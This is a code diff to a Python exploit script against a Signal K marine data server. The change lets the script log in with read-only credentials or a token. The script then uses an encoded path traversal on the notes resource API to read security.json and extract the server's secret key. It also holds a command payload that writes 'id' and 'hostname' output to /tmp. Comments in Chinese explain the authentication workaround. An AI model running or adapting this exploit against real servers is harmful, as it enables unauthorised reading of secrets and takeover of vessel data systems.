@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-import base64, hashlib, hmac, json, time, urllib.request, sys
+import base64, hashlib, hmac, json, os, time, urllib.request, sys
 
 BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:13000"
 CMD = "id > /tmp/sk-pwned; hostname >> /tmp/sk-pwned"
@@ -19,8 +19,16 @@ def post(path, body, tok=None):
 
 b64 = lambda b: base64.urlsafe_b64encode(b).rstrip(b"=").decode()
 
-print("[1] unauth traversal read security.json")
-sec = json.load(get("/signalk/v2/api/resources/notes/..%2F..%2F..%2F..%2Fsecurity.json"))
+# 默认配置下 allow_readonly=false，匿名打 traversal 会被 401 挡住。
+# 给一组只读账号即可（SK_USER/SK_PASS），或者直接给 SK_TOKEN。
+TOK0 = os.environ.get("SK_TOKEN")
+if not TOK0 and os.environ.get("SK_USER"):
+    TOK0 = json.load(post("/login", {"username": os.environ["SK_USER"],
+                                     "password": os.environ["SK_PASS"]}))["token"]
+    print("[0] readonly login ok, token", TOK0[:24] + "...")
+
+print("[1] traversal read security.json")
+sec = json.load(get("/signalk/v2/api/resources/notes/..%2F..%2F..%2F..%2Fsecurity.json", TOK0))
 sk = sec["secretKey"]
 print("    allow_readonly =", sec.get("allow_readonly"), "| secretKey len =", len(sk))
 
